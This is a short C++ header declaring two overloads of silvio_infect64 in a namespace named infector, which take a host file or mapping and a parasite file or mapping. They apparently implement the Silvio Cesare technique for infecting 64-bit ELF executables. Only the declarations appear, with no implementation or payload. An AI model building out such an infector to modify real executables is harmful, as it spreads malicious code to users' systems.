#pragma once
#include "common/mmap.hh"

namespace vt::infector {
bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                     vt::common::Mmap<PROT_READ> parasite_mapping);

bool silvio_infect64(const char* host_path, const char* parasite_path);
}  // namespace vt::infector